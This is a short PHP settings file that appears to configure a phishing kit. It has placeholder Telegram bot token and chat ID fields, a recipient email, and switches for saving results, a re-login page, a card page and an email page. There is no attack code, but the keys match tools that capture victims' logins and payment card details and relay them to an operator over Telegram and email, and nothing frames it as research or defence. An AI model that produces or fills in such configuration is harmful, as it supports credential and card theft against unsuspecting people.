<?php
$settings = array(
    "client"		=> "Mac Hemsworth",
	"telegram"		=> "1",
	"chat_id"		=> "YOURCHATID",
	"bot_url"		=> "botYOURTOKEN",
	"send_mail"		=> "1",
	"email"			=> "youremail@email.com",
	"save_results"		=> "1",
	"Relogin"		=> "1",
	"Card"			=> "1",
	"Emailpage"		=> "0",
);
return $settings;
?>	